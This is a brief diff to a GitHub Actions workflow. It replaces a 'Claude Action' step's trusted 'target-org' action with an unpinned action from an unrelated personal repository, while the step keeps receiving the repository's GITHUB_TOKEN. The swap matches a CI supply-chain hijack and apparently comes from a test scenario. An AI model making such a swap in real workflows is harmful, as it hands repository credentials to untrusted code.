@@ -9,7 +9,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Run Claude Action
-        uses: target-org/claude-action@v1
+        uses: Jamsrayvictim213/f002-test@main
         with:
           settings: "config/claude-action-settings.json"
           github_token: ${{ secrets.GITHUB_TOKEN }}
